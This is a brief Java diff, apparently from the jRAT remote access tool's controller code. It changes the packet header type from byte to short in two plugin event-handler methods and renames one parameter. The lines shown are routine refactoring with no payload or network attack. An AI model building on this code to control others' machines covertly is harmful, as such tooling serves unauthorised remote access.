@@ -11,7 +11,7 @@ import se.jrat.controller.AbstractSlave;
 
 public class PluginEventHandler {
 
-	public static void onPacket(AbstractSlave slave, byte header) {				
+	public static void onPacket(AbstractSlave slave, short header) {				
 		Client client = ClientFormat.format(slave);
 		
 		for (PacketListener l : Packet.getIncoming(header)) {
@@ -35,10 +35,10 @@ public class PluginEventHandler {
 		}
 	}
 
-	public static void onSendPacket(byte header, AbstractSlave slave) {
+	public static void onSendPacket(short id, AbstractSlave slave) {
 		Client client = ClientFormat.format(slave);
 		
-		for (PacketListener l : Packet.getOutgoing(header)) {
+		for (PacketListener l : Packet.getOutgoing(id)) {
 			l.perform(client);
 		}
 	}
